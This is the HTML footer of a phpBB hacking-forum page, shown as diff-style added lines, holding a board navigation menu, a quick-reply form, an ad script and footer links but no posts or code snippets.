value="-1">&nbsp;</option><option value="-1">XXX</option><option value="-1">----------------</option><option value="20">Porn Sites - Requests - Trade</option><option value="57">Pictures</option><option value="58">Videos</option><option value="-1">&nbsp;</option><option value="-1">General Support</option><option value="-1">----------------</option><option value="18">IRC Help - Downloads - Scripting - Networks</option><option value="12">*nix - Linux</option><option value="11">Windows</option><option value="-1">&nbsp;</option><option value="-1">Ryan1918 dot com</option><option value="-1">----------------</option><option value="1">News - Weekly Polls</option><option value="10">Links - Affiliates</option></select><input type="hidden" name="sid" value="bfed7ccaa91dbe9db8d1fcca192392e8" />&nbsp;<input type="submit" value="Go" class="liteoption" />&nbsp;</td>
+</form>
+</tr>
+</table>
+</td>
+  </tr>
+  <tr>
+	<td width="100%" nowrap="nowrap" colspan="2">
+		<table width="100%" cellpadding="2" cellspacing="1" border="0" class="forumline">
+		  <tr>
+			<td class="catHead" align="center" colspan="2" height="28"><span class="cattitle">Quick Reply</span></td>
+		  </tr>
+		  <tr>
+			<td class="row1" align="center">
+				<script language="JavaScript" type="text/javascript"><!--
+function checkForm() {
+	formErrors = false;
+	if (document.post.message.value.length < 2) {
+	formErrors = 'You must enter a message when posting.';
+	}
+	if (formErrors) {
+		alert(formErrors);
+		return false;
+	} else {
+		return true;
+	}
+}
+				//--></script>
+				<form action="posting.php" method="post" name="post" onsubmit="return checkForm(this)"><span class="genmed">
+					<textarea class="post" name="message" rows="10" cols="50" wrap="virtual"></textarea><br />
+					<input type="hidden" name="attach_sig" value="1" />
+					<input type="hidden" name="mode" value="reply" />
+					<input type="hidden" name="sid" value="bfed7ccaa91dbe9db8d1fcca192392e8" />
+					<input type="hidden" name="t" value="9078" />
+					<input type="hidden" name="notify" value="" /><br />
+					<input type="submit" name="preview" class="liteoption" value="Preview" />
+					&nbsp;
+					<input type="submit" name="post" class="mainoption" value="Submit" />
+				</span></form>
+			</td>
+		  </tr>
+		</table>
+	</td>
+  </tr>
+  <tr>
+	<td width="40%" valign="top" nowrap="nowrap" align="left"><span class="gensmall"></td>
+	<td align="right" valign="top" nowrap="nowrap"><span class="gensmall">You <b>can</b> post new topics in this forum<br />You <b>can</b> reply to topics in this forum<br />You <b>can</b> edit your posts in this forum<br />You <b>can</b> delete your posts in this forum<br />You <b>can</b> vote in polls in this forum<br /></span></td>
+  </tr>
+</table>
+
+<tr>
+	<td class="catBottom" align="center" valign="middle" nowrap="nowrap"><table border="0" cellspacing="0" cellpadding="2" width="100%">
+	<tr>
+		<form method="post" action="viewtopic.php?t=9078&amp;start=0" style="display: inline;"><td align="left" valign="middle" nowrap="nowrap"><select name="postdays"><option value="0" selected="selected">All Posts</option><option value="1">1 Day</option><option value="7">7 Days</option><option value="14">2 Weeks</option><option value="30">1 Month</option><option value="90">3 Months</option><option value="180">6 Months</option><option value="364">1 Year</option></select>&nbsp;<select name="postorder"><option value="asc" selected="selected">Oldest First</option><option value="desc">Newest First</option></select>&nbsp;<input type="submit" value="Go" class="liteoption" name="submit" /></td></form>
+		<td align="right" valign="middle" nowrap="nowrap"><table cellspacing="0" cellpadding="0" border="0">
+<tr>
+<form method="get" name="jumpbox" action="viewforum.php" onsubmit="if(document.jumpbox.f.value == -1){return false;}">
+	<td nowrap="nowrap"><select name="f" onchange="if(this.options[this.selectedIndex].value != -1){ forms['jumpbox'].submit() }"><option value="-1">Select a forum</option><option value="-1">&nbsp;</option><option value="-1">General</option><option value="-1">----------------</option><option value="9">General Chat</option><option value="7">Introduction</option><option value="21">Graphics - Flash - Design - Templates</option><option value="46">The Fight Club</option><option value="61">Anything Funny - Pictures - Videos - Logs - Websites</option><option value="63">World News- Politics - Religion - Debates - Battles</option><option value="31">Web - Shell - Hosting Reviews - Coupons - Freebies</option><option value="-1">&nbsp;</option><option value="-1">Security</option><option value="-1">----------------</option><option value="3">News</option><option value="43">Blackmarket [BUY/SELL/TRADE]</option><option value="15">General Questions - Discussion</option><option value="6">Downloads - Requests</option><option value="34">Honeypots - Found Nets - Suspicious Files</option><option value="8">Exploits</option><option value="30"selected="selected">Code snippets - Suggestions - Rent a coder</option><option value="26">Proxy - Socks - HTTP - IRC - VNC - Wordlist</option><option value="60">Defacement - Show off</option><option value="19">Cracks - Hacks - Serials</option><option value="56">Phreaking - Cell Phone - Wireless - PDA - VOIP</option><option value="41">Tutorials - Papers - Research</option><option value="-1">&nbsp;</option><option value="-1">General Downloads</option><option value="-1">----------------</option><option value="35">Applications</option><option value="23">Games</option><option value="62">Prank Radio - Pranks - Videos</option><option value="65">Magazines - E-Books - Books - Articles</option><option value="22">Music</option><option value="51">Movies - Videos - Talk</option><option value="55">Torrents - Invites - Trades</option><option value="-1">&nbsp;</option><option value="-1">XXX</option><option value="-1">----------------</option><option value="20">Porn Sites - Requests - Trade</option><option value="57">Pictures</option><option value="58">Videos</option><option value="-1">&nbsp;</option><option value="-1">General Support</option><option value="-1">----------------</option><option value="18">IRC Help - Downloads - Scripting - Networks</option><option value="12">*nix - Linux</option><option value="11">Windows</option><option value="-1">&nbsp;</option><option value="-1">Ryan1918 dot com</option><option value="-1">----------------</option><option value="1">News - Weekly Polls</option><option value="10">Links - Affiliates</option></select><input type="hidden" name="sid" value="bfed7ccaa91dbe9db8d1fcca192392e8" />&nbsp;<input type="submit" value="Go" class="liteoption" />&nbsp;</td>
+</form>
+</tr>
+</table>
+</td>
+	</tr>
+	</table>
+	</td>
+</tr>
+</table><table width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td align="right" width="100%" height="15" valign="top"><a href="#top"><img src="./templates/Morpheus/images/ftr_right.gif" width="60" height="10" alt="" /></a></td></tr></table>
+
+<table width="100%" cellspacing="1" cellpadding="4" border="0" align="center" class="nav">
+<tr>
+	<td class="nav" align="left" valign="middle" nowrap="nowrap"><span class="nav"><a href="index.php">Ryan1918 DOT COM Forum Index</a> &raquo; <a href="viewforum.php?f=30">Code snippets - Suggestions - Rent a coder</a></span></td>
+	<td class="nav navform" align="right" valign="middle" nowrap="nowrap"><span class="nav"><form action="search.php?mode=results" method="post" style="display: inline;"><input type="hidden" name="show_results" value="topics" /><input type="hidden" name="search_forum" value="30" />
+	<input type="text" name="search_keywords" class="post" size="15" />
+	<input type="submit" value="Search" class="mainoption" />
+	</form></span></td>
+</tr>
+</table>
+
+<table border="0" cellspacing="0" cellpadding="0" width="100%">
+<tr>
+	<td align="left" valign="top" style="padding-top: 5px; padding-bottom: 5px;">&nbsp;<a href="posting.php?mode=reply&amp;t=9078"><img src="templates/Morpheus/images/lang_english/blue/reply.gif" border="0" alt="Reply to topic" align="middle" /></a>
+	</td>
+	<td align="right" valign="top" style="padding-top: 5px;">&nbsp;</td>
+</tr>
+</table>
+
+<table width="100%" cellspacing="1" cellpadding="1" border="0">
+  <tr>
+	 <td align="right" valign="middle"><div class="pagination"></div></td>
+  </tr>
+</table>
+<center>
+<!-- Begin: AdBrite -->
+<script type="text/javascript">
+   var AdBrite_Title_Color = 'CC0000';
+   var AdBrite_Text_Color = '000000';
+   var AdBrite_Background_Color = 'FFFFFF';
+   var AdBrite_Border_Color = 'FFFFFF';
+</script>
+<span style="white-space:nowrap;"><script src="http://ads.adbrite.com/mb/text_group.php?sid=324956&zs=3436385f3630" type="text/javascript"></script><!---->
+</span>
+<!-- End: AdBrite -->
+
+<div id="admin_link"></div>
+<a href="http://www.nulledsec.com" target="_phpbb"><b>Free PORN!</b></a> <br />
+<a href="http://www.phpbb.com/" target="_phpbb">phpBB</a> <br />
+</div>
+<!-- content -->
+</center>
+	</td><td width="10" class="border_right"><img src="./templates/Morpheus/images/spacer.gif" width="10" height="1" alt="" /></td>
+</tr>
+</table>
+</body>
+</html>
+
